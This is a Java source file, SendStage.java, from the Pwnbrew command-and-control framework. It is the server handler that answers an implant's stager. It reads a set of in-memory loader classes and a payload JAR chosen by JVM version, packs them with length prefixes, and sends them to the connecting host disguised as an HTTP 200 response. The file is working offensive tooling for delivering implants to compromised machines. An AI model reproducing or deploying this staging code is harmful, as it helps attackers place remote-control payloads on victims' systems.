/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/

/*
* SendStage.java
*
* Created on Oct 7, 2013, 10:12:33 PM
*/

package pwnbrew.network.control.messages;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.logging.Level;
import pwnbrew.logging.Log;
import pwnbrew.manager.CommManager;
import pwnbrew.manager.DataManager;
import pwnbrew.misc.Constants;
import pwnbrew.network.ControlOption;
import pwnbrew.network.PortRouter;
import pwnbrew.network.control.ControlMessageManager;
import pwnbrew.network.http.Http;
import pwnbrew.selector.SocketChannelHandler;
import pwnbrew.utilities.SocketUtilities;
import pwnbrew.utilities.Utilities;

/**
 *
 *  
 */
public final class SendStage extends ControlMessage{ // NO_UCD (use default)
    
    private static final byte OPTION_JVM_VERSION = 16;   
    protected static final String NAME_Class = SendStage.class.getSimpleName();
    private String theJvmVersion;
  
    // ==========================================================================
    /**
     * Constructor
     *
     * @param dstHostId
    */
    public SendStage( int dstHostId ) {
        super( dstHostId );
    }
    
     // ==========================================================================
    /**
     * Constructor
     *
     * @param passedId
    */
    public SendStage(byte[] passedId ) {
        super( passedId );
    }
    
    //=========================================================================
    /**
     *  Sets the variable in the message related to this TLV
     * 
     * @param tempTlv 
     * @return  
     */
    @Override
    public boolean setOption( ControlOption tempTlv ){      
        
        boolean retVal = true;
        try {
            byte[] theValue = tempTlv.getValue();
            switch( tempTlv.getType()){
                case OPTION_JVM_VERSION:
                     theJvmVersion = new String( theValue, "US-ASCII");
                    break;
                default:
                    retVal = false;
                    break;              
            }
        } catch (UnsupportedEncodingException ex) {
            ex = null;
        }        
        return retVal;
    }  
    
      
    //===============================================================
    /**
    *   Performs the logic specific to the message.
    *
     * @param passedManager
    */
    @Override
    public void evaluate( CommManager passedManager ) {       
            
        ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
        if( aCMManager != null ){

            PortRouter aPR = passedManager.getPortRouter( aCMManager.getPort());
            //If it is an old stager then the msg id will be set 
            int tmpId = getMsgId();
            byte[] tempArr = SocketUtilities.intToByteArray(tmpId);
            if( Arrays.equals( tempArr, Constants.OLD_STAGER_MARKER)){
              
                try {
                    
                    File payloadFile = Utilities.getPayloadFile( theJvmVersion );
                    if( payloadFile.exists() ){

                        byte[] byteBuffer = new byte[Constants.GENERIC_BUFFER_SIZE];
                        String[] stagedClasses = new String[]{ 
                            "pwnbrew/stage/Stage",
                            "pwnbrew/stage/MemoryJarFile",
                            "pwnbrew/stage/MemoryBufferURLConnection",
                            "pwnbrew/stage/MemoryBufferURLStreamHandler",
                            "pwnbrew/stage/Pwnbrew",
                        };

                        SocketChannelHandler aSCH = aPR.getSocketChannelHandler( getSrcHostId());

                        //Send each staged class
                        ByteBuffer classByteBuffer = ByteBuffer.allocate(256000);
                        for( String aClass : stagedClasses ){

                            int bytesRead = 0;
                            String thePath = aClass;             
                            InputStream anIS = SendStage.class.getClassLoader().getResourceAsStream(thePath);

                            //Read the bytes into a byte array
                            ByteArrayOutputStream theBOS = new ByteArrayOutputStream();
                            try {

                                //Read to the end
                                while( bytesRead != -1){
                                    bytesRead = anIS.read(byteBuffer);
                                    if(bytesRead != -1){
                                        theBOS.write(byteBuffer, 0, bytesRead);
                                    }
                                }

                                theBOS.flush();

                            } finally {

                                //Close output stream
                                theBOS.close();
                            }            

                            //Queue up the classes to be sent
                            tempArr = theBOS.toByteArray();
                            byte[] theBytes = new byte[ tempArr.length + 4 ];

                            byte[] classLen = SocketUtilities.intToByteArray(tempArr.length);
                            System.arraycopy(classLen, 0, theBytes, 0, classLen.length); 
                            System.arraycopy(tempArr, 0, theBytes, 4, tempArr.length);                

                            //Queue the bytes
                            classByteBuffer.put(theBytes);
                            theBOS = null;
                        }

                        //Add file ending byte
                        classByteBuffer.put( new byte[]{ 0x0, 0x0, 0x0, 0x0});

                        //Add jar and jar length
                        FileInputStream anIS = new FileInputStream( payloadFile );
                        try {

                            //Add the jar size
                            byte[] jarSize = SocketUtilities.intToByteArray( (int)payloadFile.length() );
                            classByteBuffer.put(jarSize);

                            //Read the bytes into the byte buffer
                            int bytesRead = 0;
                            while( bytesRead != -1){
                                bytesRead = anIS.read(byteBuffer);
                                if(bytesRead != -1){
                                    classByteBuffer.put(byteBuffer, 0 , bytesRead );
                                }
                            }

                        } catch (IOException ex) {
                            Log.log(Level.SEVERE, NAME_Class, "evaluate()", ex.getMessage(), ex );
                        } finally {
                            try {
                                anIS.close();
                            } catch(IOException ex){

                            }
                        }


                        //Queue the bytes
                        byte[] classBytes = Arrays.copyOf(classByteBuffer.array(), classByteBuffer.position());
                        ByteBuffer aBB = constructReply(classBytes);
                        aSCH.queueBytes( Arrays.copyOf( aBB.array(), aBB.position()));

                    } else {
                       Log.log(Level.SEVERE, NAME_Class, "evaluate()", "A payload has not be loaded.  Aborting staging.", null );

                    }
                
                } catch (IOException ex) {
                    Log.log(Level.SEVERE, NAME_Class, "evaluate()", ex.getMessage(), ex );
                }

            } else {            
                
                try {
                    //Get the socketchannel handler
                    int clientId = getSrcHostId();
                    SocketChannelHandler aSCH = aPR.getSocketChannelHandler( clientId );

                    //Turn on staging flag and send the payload if it isn't relayed
                    if( aSCH.setStaging(clientId, true, theJvmVersion) ) {
                        Payload aPayload = Utilities.getClientPayload(clientId, theJvmVersion);
                        if( aPayload != null )
                            DataManager.send(passedManager,aPayload);
                        else
                            Log.log(Level.SEVERE, NAME_Class, "evaluate()", "Unable to retrieve payload, ensure one has been loaded into the library", null );
                        
                    }
                } catch (UnsupportedEncodingException ex) {
                }
            }
        }
 
    }
    
        
    
    //======================================================================
    /**
     * 
     * @param classBytes
     * @return 
     */
    private ByteBuffer constructReply( byte[] classBytes ){
       
         //Allocate and add the bytes from the message
        Http aHttpMsg = Http.getGeneric( Http._200 );
        
        //Set the bytes
        if( classBytes.length > 0 ){         
             
            aHttpMsg.setPayloadBytes( classBytes );                    
            aHttpMsg.setOption( Http.CONTENT_LENGTH, Integer.toString(classBytes.length) );
         
        }
        
        //Allocate enough space
        int httpLen = aHttpMsg.getLength();
        ByteBuffer aByteBuffer = ByteBuffer.allocate( httpLen );
        
        //Add the bytes
        aHttpMsg.append(aByteBuffer);
        return aByteBuffer;
    }

}
